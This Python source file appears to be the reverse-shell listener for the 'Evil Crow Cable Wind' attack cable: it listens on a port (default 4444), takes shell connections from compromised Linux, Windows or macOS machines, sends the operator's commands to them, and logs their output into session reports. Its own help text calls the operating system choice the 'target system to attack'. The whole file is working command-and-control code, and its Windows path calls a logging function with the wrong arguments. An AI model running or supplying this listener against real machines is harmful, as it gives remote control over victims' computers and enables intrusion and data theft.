import socket
import threading
import sys
import signal
import argparse
import os
import shutil
from pathlib import Path
from dataclasses import dataclass

server_socket = None
client_socket = None
running = True
session_log = None
session_start = None
session_remote = None
bytes_received = 0
bytes_sent = 0

@dataclass
class SessionContext:
    session_dir: Path
    session_log: Path
    session_start: object
    session_remote: str
    recipient_os: str = "unknown"
    bytes_received: int = 0
    bytes_sent: int = 0

def write_session(session, direction, data):
    if session is None:
        return
    session_log = session.session_log
    from datetime import datetime
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if isinstance(data, bytes):
        text = data.decode("utf-8", errors="replace")
    else:
        text = str(data)
    with open(session_log, "a", encoding="utf-8") as f:
        for line in text.splitlines():
            f.write(f"[{stamp}] {direction}: {line}\n")

def write_session_summary(session):
    if session is None:
        return
    session_log = session.session_log
    session_start = session.session_start
    session_remote = session.session_remote
    bytes_received = session.bytes_received
    bytes_sent = session.bytes_sent

    summary_path = session_log.parent / "SESSION_SUMMARY.txt"
    from datetime import datetime
    end_time = datetime.now()

    with open(summary_path, "w", encoding="utf-8") as f:
        f.write("EVIL CROW CABLE WIND - SESSION SUMMARY\n")
        f.write("=" * 50 + "\n")
        f.write(f"Session start: {session_start or 'UNKNOWN'}\n")
        f.write(f"Session end:   {end_time}\n")
        f.write(f"Remote endpoint: {session_remote or 'UNKNOWN'}\n")
        f.write(f"Bytes received: {bytes_received}\n")
        f.write(f"Bytes sent:     {bytes_sent}\n")
        f.write(f"Recipient OS: {session.recipient_os}\n")
        f.write("=" * 50 + "\n")

    write_session(session,
        "EVENT",
        f"SESSION_SUMMARY | remote={session_remote or 'UNKNOWN'} | bytes_received={bytes_received} | bytes_sent={bytes_sent} | ended={end_time}"
    )

def write_session_report(session):
    if session is None:
        return
    session_log = session.session_log

    session_dir = session_log.parent
    summary_path = session_dir / "SESSION_SUMMARY.txt"
    received_path = session_dir / "received.log"
    report_path = session_dir / "REPORT.txt"

    with open(report_path, "w", encoding="utf-8") as report:
        report.write("EVIL CROW CABLE WIND - PAYLOAD SESSION REPORT\n")
        report.write("=" * 70 + "\n\n")

        if summary_path.exists():
            report.write("SESSION SUMMARY\n")
            report.write("-" * 70 + "\n")
            report.write(summary_path.read_text(encoding="utf-8", errors="replace"))
            report.write("\n")

        report.write("CHRONOLOGICAL SESSION LOG\n")
        report.write("-" * 70 + "\n")
        if session_log.exists():
            report.write(session_log.read_text(encoding="utf-8", errors="replace"))
        else:
            report.write("(No session log data)\n")

        report.write("\n")
        report.write("RAW DEVICE DATA\n")
        report.write("-" * 70 + "\n")
        report.write(f"Raw data file: {received_path.name}\n")
        if received_path.exists():
            raw = received_path.read_bytes()
            report.write(f"Raw data size: {len(raw)} bytes\n")
            report.write("Raw data (hex):\n")
            if raw:
                for offset in range(0, len(raw), 16):
                    chunk = raw[offset:offset + 16]
                    hex_bytes = " ".join(f"{b:02x}" for b in chunk)
                    report.write(f"{offset:08x}: {hex_bytes}\n")
            else:
                report.write("(No raw device data)\n")
        else:
            report.write("Raw data size: 0 bytes\n")

def signal_handler(sig, frame):
    global server_socket, client_socket, running
    print("\nInterrupt received. Closing server...")
    running = False
    if client_socket:
        client_socket.shutdown(socket.SHUT_RDWR)
    if server_socket:
        pass  # listener closes in server cleanup
    return

def handle_client_connection_linux(client_socket, session):
    global running
    log_path = session.session_log.parent / "received.log"
    log_file = open(log_path, "ab", buffering=0)

    write_session(
        session,
        "RECIPIENT",
        f"RECEIVE_LOOP_STARTED | remote={session.session_remote}"
    )

    chunk_number = 0

    while running:
        try:
            data = client_socket.recv(4096)

            if data:
                chunk_number += 1
                chunk_size = len(data)
                session.bytes_received += chunk_size

                write_session(
                    session,
                    "RECIPIENT",
                    f"DATA_RECEIVED | chunk={chunk_number} | bytes={chunk_size} | total_bytes={session.bytes_received}"
                )

                log_file.write(data)

                write_session(
                    session,
                    "RECIPIENT",
                    f"RAW_WRITE_COMPLETE | chunk={chunk_number} | bytes={chunk_size} | total_bytes={session.bytes_received}"
                )

                write_session(session, "DEVICE -> SERVER", data)

            if not data:
                print("\nClient disconnected")
                write_session(
                    session,
                    "RECIPIENT",
                    f"CLIENT_DISCONNECTED | remote={session.session_remote} | chunks={chunk_number} | bytes_received={session.bytes_received}"
                )
                write_session(
                    session,
                    "EVENT",
                    f"DISCONNECTED {session.session_remote} | bytes_received={session.bytes_received} | bytes_sent={session.bytes_sent}"
                )
                break

            try:
                message = data.decode('utf-8')
                write_session(
                    session,
                    "RECIPIENT",
                    f"DECODE_COMPLETE | chunk={chunk_number} | encoding=utf-8 | bytes={len(data)}"
                )
                if message:
                    message = message.replace('\r\n', '\n').replace('\r', '\n')
                    print(message, end='', flush=True)
            except UnicodeDecodeError:
                write_session(
                    session,
                    "RECIPIENT",
                    f"DECODE_COMPLETE | chunk={chunk_number} | encoding=latin-1 | bytes={len(data)}"
                )
                print(data.decode('latin-1'), end='', flush=True)

        except Exception as e:
            write_session(
                session,
                "RECIPIENT",
                f"RECEIVE_ERROR | {type(e).__name__}: {e}"
            )
            print(f"\nError receiving data: {e}")
            running = False
            break

    write_session(
        session,
        "RECIPIENT",
        f"RECEIVE_LOOP_ENDED | chunks={chunk_number} | bytes_received={session.bytes_received}"
    )
    write_session_summary(session)
    write_session_report(session)
    log_file.close()

def send_commands_to_client_linux(client_socket, session):
    global running
    while running:
        try:
            try:
                command = input()
            except EOFError:
                # No interactive terminal input; keep the connection alive.
                return
            if command.lower() in ["exit", "quit"]:
                running = False
                client_socket.close()
                break

            if command:
                payload = f"{command}\n".encode("utf-8")
                write_session(session, "SERVER -> DEVICE", payload)
                client_socket.sendall(payload)
                session.bytes_sent += len(payload)
        except Exception as e:
            print(f"\nError sending data: {e}")
            running = False
            break

def start_server_linux(host='0.0.0.0', port=4444, os_type='linux'):
    global server_socket, client_socket, running, session_log, session_start, session_remote, bytes_received, bytes_sent
    log_dir = Path.home() / "EvilCrow-Server" / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    from datetime import datetime
    session_start = None
    session_remote = None
    bytes_received = 0
    bytes_sent = 0

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(5)
        server_socket.settimeout(0.5)
        print(f"[*] Listening on {host}:{port}")

        while running:
            try:
                client_socket, client_address = server_socket.accept()
            except socket.timeout:
                continue

            session_stamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S-%f')
            session_dir = log_dir / f"session-{session_stamp}"
            session_dir.mkdir(parents=True, exist_ok=True)
            session_log = session_dir / "session.log"
            session_log.touch()

            session = SessionContext(
                session_dir=session_dir,
                session_log=session_log,
                session_start=datetime.now(),
                session_remote=f"{client_address[0]}:{client_address[1]}",
                    recipient_os=os_type
            )

            print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
            write_session(session, "EVENT", f"CONNECTED {session.session_remote}")

            receive_thread = threading.Thread(target=handle_client_connection_linux, args=(client_socket, session))
            send_thread = threading.Thread(target=send_commands_to_client_linux, args=(client_socket, session))

            receive_thread.daemon = True
            send_thread.daemon = True

            receive_thread.start()
            send_thread.start()

            # Keep the listener available for additional connections.
            # The per-session receive thread owns the client connection.

    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        running = False
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def start_server_windows(host, port):
    global server_socket, client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[*] Listening on {host}:{port}")

    try:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
        write_session("EVENT", f"CONNECTED {client_address[0]}:{client_address[1]}")

        while True:
            command = input("\nShell> ").strip()

            if command.lower() in ["exit", "quit"]:
                break

            client_socket.sendall((command + '\n').encode('utf-8'))

            response = b""
            while True:
                part = client_socket.recv(4096)
                if not part:
                    break
                response += part

                if b"END_OF_COMMAND" in response:
                    break

            final_response = response.decode('utf-8', errors='replace').strip()
            final_response = final_response.replace("END_OF_COMMAND", "")
            print_formatted_response(final_response)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def print_formatted_response(response):
    lines = response.splitlines()
    for line in lines:
        if line.strip():
            print(line)

def main():
    parser = argparse.ArgumentParser(description="Server for shell connection.")
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    parser.add_argument("--target", type=str, required=True, choices=["linux", "windows", "macos"], help="Target system to attack")

    args = parser.parse_args()
    port = args.port
    os_type = args.target

    signal.signal(signal.SIGINT, signal_handler)

    if os_type == 'linux':
        start_server_linux(port=args.port, os_type=os_type)
    elif os_type == 'windows':
        start_server_windows(host='0.0.0.0', port=args.port)
    if os_type == 'macos':
        start_server_linux(port=args.port, os_type=os_type)

if __name__ == "__main__":
    main()
